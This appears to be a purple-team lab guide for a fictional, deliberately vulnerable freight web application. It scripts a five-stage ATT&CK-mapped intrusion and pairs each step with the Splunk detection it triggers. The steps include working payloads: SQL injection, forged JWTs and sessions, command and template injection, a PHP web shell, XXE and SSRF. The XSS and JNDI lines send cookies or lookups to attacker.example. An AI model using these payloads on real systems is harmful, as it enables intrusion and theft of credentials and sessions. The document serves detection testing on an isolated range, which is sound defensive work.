# Attack simulation — Meridian Freight Solutions test target

A five-stage adversary simulation, mapped to MITRE ATT&CK, with the exact command
for every step and the detection each one fires. Run it to exercise the SIEM,
then confirm the kill chain was reconstructed.

Meridian Freight Solutions is a fictional company. Every identity, reference and
credential is synthetic. Run this only against an isolated range.

> This document reproduces how an intrusion actually unfolds — recon → foothold →
> escalation → execution → exfiltration — from a single source, paced so the
> stages are distinguishable in the SIEM. For the per-finding reference (each
> vulnerability in isolation, with remediation) see
> [`ASSESSMENT_PLAYBOOK.md`](ASSESSMENT_PLAYBOOK.md).

---

## 1. Run it

The whole campaign is scripted:

```bash
# Docker
./tools/simulate_attack.sh http://127.0.0.1:5005

# Native (paths and interpreter differ)
APP_ROOT="$PWD" METADATA_URL="http://127.0.0.1:8080" \
  PYTHON="$PWD/.venv/bin/python" ./tools/simulate_attack.sh http://127.0.0.1:5005

# Windows / IIS
.\tools\Validate-Range.ps1 -BaseUrl http://localhost:8080 -MetadataPort 8081
```

| Variable | Default | Purpose |
|---|---|---|
| `RUN_ID` | `sim-<timestamp>` | Tags every request, isolates the run in Splunk |
| `PACE` | `2` | Seconds between steps; raise it to spread the campaign |
| `APP_ROOT` | `/app` | Absolute path used by the XXE payload |
| `METADATA_URL` | `http://metadata:8080` | SSRF destination |
| `PYTHON` | `python3` | Interpreter for the session forge |

Expected ending:

```
22/22 data artifacts exfiltrated in 24 steps
```

Every request carries a consistent user agent and the run id, so the campaign
appears as one actor rather than unrelated calls.

---

## 2. ATT&CK coverage at a glance

| Tactic | Techniques |
|---|---|
| Reconnaissance | T1595.003, T1592, T1592.002 |
| Initial Access | T1190, T1189 |
| Execution | T1059.004, T1059.006, T1059.007, T1203 |
| Persistence | T1505.003, T1098 |
| Privilege Escalation | T1548 |
| Defense Evasion | T1550.001, T1550.004 |
| Credential Access | T1110.001, T1110.002, T1552.001, T1552.005, T1556 |
| Discovery | T1083, T1087 |
| Collection | T1005, T1213 |
| Command and Control | T1090 |
| Impact | T1565.001 |
| Lateral Movement | T1078, T1078.003 |

13 techniques across 12 tactics. The `$BASE` variable below is the target URL:

```bash
export BASE=http://127.0.0.1:5005
```

---

## 3. Stage 1 — Reconnaissance

*Enumerate the estate and harvest anything left in the open. No exploitation yet;
the attacker is building a map and collecting credentials for stage 2.*

| Tactic | Technique | ID |
|---|---|---|
| Reconnaissance | Active Scanning: Wordlist Scanning | T1595.003 |
| Reconnaissance | Gather Victim Host Information | T1592 / T1592.002 |
| Collection | Data from Information Repositories | T1213 |
| Credential Access | Unsecured Credentials: Credentials In Files | T1552.001 |

### 1.1 Read the crawler directives — T1595.003

```bash
curl -s $BASE/robots.txt
```

Discloses `/internal/`, `/backups/`, `/admin/`, `/portal/`, `/status/`.
**Event:** `recon_robots_read`.

### 1.2 Content discovery — T1595.003

```bash
for p in .git/config web.config appsettings.json phpinfo.php config.old; do
  curl -s -o /dev/null -w "%{http_code} $p\n" "$BASE/$p"
done
ffuf -u "$BASE/FUZZ" -w wordlists/meridian-paths.txt -mc 200 -t 20
```

**Events:** `http_not_found` (the 404 noise a scanner generates) → **UC-01**.

### 1.3 Retrieve the internal runbook — T1592.002

```bash
curl -s $BASE/internal/it-runbook.txt
```

**Recovered:** the IT runbook — duty escalation code, and three tickets naming
the legacy login, the depot tool and the unrotated session key.
**Events:** `recon_hidden_path`, `sensitive_file_access` → **UC-01**.

### 1.4 Pull the environment file — T1552.001

```bash
curl -s $BASE/.env
```

**Recovered:** session signing key, partner JWT key, EDI service password.
**Event:** `sensitive_file_access` → **UC-02**.

### 1.5 Browse the nightly export — T1552.001, T1213

```bash
curl -s $BASE/backups/
curl -s $BASE/backups/meridian-db-export.sql
```

**Recovered:** the account list (`svc_edi`, `avoss`, `ops_console`).
**Events:** `directory_listing_access`, `sensitive_file_access` → **UC-02**.

### 1.6 Read the status page — T1592

```bash
curl -s $BASE/status/diagnostics | jq
```

**Recovered:** log4j 2.14.1, and that `alg:none` is accepted.
**Event:** `debug_endpoint_access` → **UC-03**.

**Detection — the scanner-vs-human question**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type IN (recon_robots_read,recon_hidden_path,http_not_found)
| bin _time span=5m
| stats count dc(path) as unique_paths by _time source_ip
| where count>=10 OR unique_paths>=8
```

---

## 4. Stage 2 — Initial Access

*Use the map and credentials from stage 1 to get inside.*

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Discovery | Account Discovery | T1087 |
| Credential Access | Brute Force: Password Guessing | T1110.001 |
| Lateral Movement | Valid Accounts | T1078, T1078.003 |

### 2.1 Enumerate consignments (IDOR) — T1190, T1087

```bash
for n in $(seq 4466 4473); do
  printf 'MFS-2026-%s ' "$n"
  curl -s "$BASE/api/v1/shipments/MFS-2026-$n" | jq -r '.contents // .error'
done
curl -s $BASE/api/v1/shipments/MFS-2026-4471 | jq
```

**Recovered:** another customer's EUR 742,000 consignment on customs hold.
**Event:** `broken_access_attempt` → **UC-04**.

### 2.2 UNION-based SQL injection — T1190, T1213

```bash
curl -sG $BASE/api/v1/rates/search --data-urlencode "q='"
curl -sG $BASE/api/v1/rates/search \
  --data-urlencode "q=' UNION SELECT id,partner,api_key FROM integration_credentials-- "
```

**Recovered:** partner API keys. **Events:** `sql_error`, `sql_query suspicious=true` → **UC-06**.

### 2.3 Brute force the service account — T1110.001, T1078.003

```bash
for p in Autumn2023 autumn2023 Password1 summer2024 autumn2024; do
  curl -s -X POST $BASE/portal/login -H 'Content-Type: application/json' \
    -d "{\"username\":\"svc_edi\",\"password\":\"$p\"}"
done
```

**Recovered:** `svc_edi` / `autumn2024`. **Events:** repeated
`authentication_attempt`, then `brute_force_suspected lockout_applied=false` → **UC-13**.

### 2.4 Auth bypass on the legacy login — T1190, T1078

```bash
curl -s -X POST "$BASE/portal/login?legacy=1" -H 'Content-Type: application/json' \
  -d '{"username":"ops_console'\''-- ","password":"x"}'
```

**Recovered:** the operations console account. **Events:** `sql_query suspicious=true`,
`authentication_attempt injection=true` → **UC-06 + UC-13**.

---

## 5. Stage 3 — Privilege Escalation

*Turn customer-level access into staff and finance access.*

| Tactic | Technique | ID |
|---|---|---|
| Privilege Escalation | Abuse Elevation Control Mechanism | T1548 |
| Persistence | Account Manipulation | T1098 |
| Defense Evasion | Alternate Auth Material: Application Access Token | T1550.001 |
| Defense Evasion | Alternate Auth Material: Web Session Cookie | T1550.004 |
| Credential Access | Modify Authentication Process | T1556 |

### 3.1 Mass assignment — T1548, T1098

```bash
curl -s -X POST $BASE/portal/profile -H 'Content-Type: application/json' \
  -d '{"contact_name":"Dana Okafor","account_type":"operations"}'
```

**Recovered:** the operations dashboard and dispatch code.
**Events:** `mass_assignment_attempt`, `privilege_change mechanism=mass_assignment` → **UC-05**.

### 3.2 Forge a staff session — T1550.004, T1110.002

```bash
FORGED=$(python3 tools/forge_session.py --secret 'meridian-default-signing-key')
curl -s -H "Cookie: session=$FORGED" $BASE/admin
```

**Recovered:** the admin area and the DR master code.
**Event:** `forged_session_detected` → **UC-14**.

### 3.3 Unsigned partner token (alg:none) — T1550.001, T1548

```bash
b64() { printf '%s' "$1" | base64 | tr -d '=\n' | tr '/+' '_-'; }
TOKEN="$(b64 '{"alg":"none","typ":"JWT"}').$(b64 '{"sub":"harborline","role":"finance"}')."
curl -s -H "Authorization: Bearer $TOKEN" $BASE/api/v1/reports/financial | jq
```

**Recovered:** the quarterly financial report.
**Event:** `jwt_unsigned_accepted` → **UC-14**.

### 3.4 Account takeover via predictable reset — T1556

```bash
TOKEN=$(printf '%s' 'avoss' | md5sum | cut -d' ' -f1)   # macOS: md5 -q
curl -s -X POST $BASE/portal/reset -H 'Content-Type: application/json' -d '{"username":"avoss"}'
curl -s -X POST $BASE/api/v1/account/reset -H 'Content-Type: application/json' \
  -d "{\"username\":\"avoss\",\"token\":\"$TOKEN\"}"
```

**Recovered:** the finance contact's account and banking reference.
**Event:** `account_takeover` → **UC-15**.

---

## 6. Stage 4 — Execution

*From a staff foothold, run code and script on the server and the staff browser.*

| Tactic | Technique | ID |
|---|---|---|
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Execution | Command and Scripting Interpreter: Python | T1059.006 |
| Execution | Command and Scripting Interpreter: JavaScript | T1059.007 |
| Execution | Exploitation for Client Execution | T1203 |
| Persistence | Server Software Component: Web Shell | T1505.003 |

### 4.1 Command injection — T1059.004

```bash
curl -s -X POST $BASE/admin/diagnostics -H 'Content-Type: application/json' \
  -H "Cookie: session=$FORGED" \
  -d '{"host":"127.0.0.1; cat instance/keys/depot-transfer.key"}' | jq -r .output
```

Windows target: `{"host":"127.0.0.1 & type instance\\keys\\depot-transfer.key"}`.
**Events:** `command_injection_attempt`, `command_execution` → **UC-09** (very high fidelity).

### 4.2 Server-side template injection — T1059.006

```bash
curl -sG $BASE/admin/campaigns/preview -H "Cookie: session=$FORGED" --data-urlencode 'body={{7*7}}'
curl -sG $BASE/admin/campaigns/preview -H "Cookie: session=$FORGED" --data-urlencode \
  "body={{ cycler.__init__.__globals__.__builtins__.open('instance/keys/campaign-signing.key').read() }}"
```

**Event:** `ssti_attempt` → **UC-10**.

### 4.3 Unrestricted upload — T1505.003

```bash
printf '<?php system($_GET["c"]); ?>\n' > /tmp/cv.php
curl -s -X POST $BASE/careers/apply -F 'cv=@/tmp/cv.php'
curl -s $BASE/uploads/          # browsable store
curl -s $BASE/uploads/hr-onboarding-pack-2026.txt
```

**Recovered:** the internal HR onboarding pack.
**Events:** `dangerous_upload`, `uploaded_file_served` → **UC-12**.

### 4.4 Log4Shell-class lookup — T1203

```bash
curl -s -H 'X-Tracking-Agent: ${jndi:ldap://attacker.example/a}' $BASE/api/v1/audit/event | jq
```

**Event:** `jndi_lookup_detected` → **UC-18**. (Simulated — no lookup is resolved.)

### 4.5 Stored XSS against staff — T1059.007

```bash
curl -s -X POST $BASE/contact -H 'Content-Type: application/json' \
  -d '{"name":"R Menon","company":"Northgate","email":"r@northgate.example",
       "message":"<script>fetch(\"//attacker.example/?c=\"+document.cookie)</script>"}'
curl -s -H "Cookie: session=$FORGED" $BASE/admin/messages | grep mfs_staff_session
```

**Events:** `stored_xss_persisted`, `staff_session_compromised` → **UC-07**.

### 4.6 Reflected XSS against a support agent — T1059.007, T1189

```bash
curl -sG $BASE/support/shared-search \
  --data-urlencode 'q=<script>fetch("//attacker.example/?c="+document.cookie)</script>' | jq
```

**Events:** `xss_probe`, `agent_session_compromised` → **UC-07**.

---

## 7. Stage 5 — Collection and Exfiltration

*Read the files and secrets the earlier stages made reachable, and abuse business
logic for financial impact.*

| Tactic | Technique | ID |
|---|---|---|
| Collection | Data from Local System | T1005 |
| Credential Access | Cloud Instance Metadata API | T1552.005 |
| Command and Control | Proxy | T1090 |
| Discovery | File and Directory Discovery | T1083 |
| Impact | Data Manipulation: Stored Data Manipulation | T1565.001 |

### 5.1 Path traversal — T1083, T1005

```bash
curl -sG $BASE/api/v1/invoices/download --data-urlencode 'document=../instance/app-secrets.ini'
```

**Recovered:** application secrets. **Event:** `path_traversal_attempt` → **UC-08**.

### 5.2 XXE file read — T1005

```bash
curl -s -X POST $BASE/api/v1/edi/manifest -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0"?>
<!DOCTYPE m [<!ENTITY x SYSTEM "file:///app/instance/edi/partner-manifest.key">]>
<manifest><consignor>&x;</consignor></manifest>'
```

**Recovered:** the EDI signing key. **Event:** `xxe_attempt` → **UC-11**.

### 5.3 SSRF to cloud metadata — T1090, T1552.005

```bash
curl -sG $BASE/admin/integrations/preview -H "Cookie: session=$FORGED" --data-urlencode \
  'url=http://metadata:8080/latest/meta-data/iam/security-credentials/mfs-web-instance-role'
```

**Recovered:** instance role credentials. **Event:** `ssrf_probe` → **UC-16**.

### 5.4 Business logic abuse — T1565.001

```bash
curl -s -X POST $BASE/services/quote -H 'Content-Type: application/json' \
  -d '{"weight_kg":-1200,"rate_per_kg":0.42}' | jq
```

**Recovered:** a credit note. **Event:** `business_logic_abuse negative_total=true` → **UC-17**.

Every successful step also emits `artifact_disclosed` (**UC-22**) — the
operator-side record that a real data asset actually left the application.

---

## 8. Confirm the SIEM reconstructed it

The point of the run is not that 22 values came back — it is whether your
detections saw a single actor progress through the whole chain.

### Did the individual detections fire?

```spl
index=vapt_lab sourcetype=helpag:owasp:json test_id="<your run id>"
| stats count values(path) as paths by event_type severity
| sort - severity count
```

### Did UC-21 reconstruct the kill chain?

```spl
index=vapt_lab sourcetype=helpag:owasp:json test_id="<your run id>"
| `helpag_kill_chain_stage`
| search stage=*
| stats dc(stage) as stages values(stage) as observed values(event_type) as events
        min(_time) as first max(_time) as last by source_ip
| where stages>=3
```

One `source_ip` touching all four stages is a confirmed intrusion. If the
`helpag_kill_chain_stage` macro is not installed, inline it from
`splunk/TA-helpag-vapt/default/macros.conf`.

### Did the data actually leave? (UC-22)

```spl
index=vapt_lab sourcetype=helpag:owasp:json test_id="<your run id>" event_type=artifact_disclosed
| stats count values(finding_title) as findings values(proof_artifact) as artifacts by source_ip
```

### The tuning exercise

Run the simulation, then run a scanner (`nuclei -u $BASE`) with a different run
id, and compare. The scanner floods stages 1–2 and rarely reaches 3–4; the
simulation moves cleanly through all five and ends in `artifact_disclosed`. If
your alerting cannot tell them apart, that is the finding — and the most valuable
output of the range.

### Locally, without Splunk

```bash
jq -r 'select(.test_id=="<your run id>").event_type' logs/meridian-events.jsonl \
  | sort | uniq -c | sort -rn
```

A full run produces ~150 events across ~40 event types from one source, with 22
`artifact_disclosed` events — one per finding.

---

## 9. Step-to-detection matrix

| Stage | Step | Technique | Event(s) | UC |
|---|---|---|---|---|
| 1 | robots.txt | T1595.003 | `recon_robots_read` | UC-01 |
| 1 | content discovery | T1595.003 | `http_not_found` | UC-01 |
| 1 | runbook | T1592.002 | `recon_hidden_path` | UC-01 |
| 1 | .env | T1552.001 | `sensitive_file_access` | UC-02 |
| 1 | db export | T1552.001 | `directory_listing_access` | UC-02 |
| 1 | status page | T1592 | `debug_endpoint_access` | UC-03 |
| 2 | IDOR | T1190/T1087 | `broken_access_attempt` | UC-04 |
| 2 | SQLi union | T1190 | `sql_query`, `sql_error` | UC-06 |
| 2 | brute force | T1110.001 | `brute_force_suspected` | UC-13 |
| 2 | legacy auth bypass | T1190/T1078 | `authentication_attempt injection=true` | UC-06/13 |
| 3 | mass assignment | T1548/T1098 | `privilege_change` | UC-05 |
| 3 | forged session | T1550.004 | `forged_session_detected` | UC-14 |
| 3 | JWT alg:none | T1550.001 | `jwt_unsigned_accepted` | UC-14 |
| 3 | reset takeover | T1556 | `account_takeover` | UC-15 |
| 4 | command injection | T1059.004 | `command_execution` | UC-09 |
| 4 | SSTI | T1059.006 | `ssti_attempt` | UC-10 |
| 4 | upload | T1505.003 | `dangerous_upload` | UC-12 |
| 4 | JNDI | T1203 | `jndi_lookup_detected` | UC-18 |
| 4 | stored XSS | T1059.007 | `staff_session_compromised` | UC-07 |
| 4 | reflected XSS | T1189 | `agent_session_compromised` | UC-07 |
| 5 | traversal | T1083/T1005 | `path_traversal_attempt` | UC-08 |
| 5 | XXE | T1005 | `xxe_attempt` | UC-11 |
| 5 | SSRF | T1552.005 | `ssrf_probe` | UC-16 |
| 5 | logic abuse | T1565.001 | `business_logic_abuse` | UC-17 |
| all | any exfiltration | — | `artifact_disclosed` | UC-22 |
| all | full chain | — | multi-stage | UC-21 |

Detection SPL for every use case: `splunk/TA-helpag-vapt/default/savedsearches.conf`
and [`SPLUNK_INTEGRATION_GUIDE.md`](SPLUNK_INTEGRATION_GUIDE.md). Per-finding
remediation: [`ASSESSMENT_PLAYBOOK.md`](ASSESSMENT_PLAYBOOK.md).
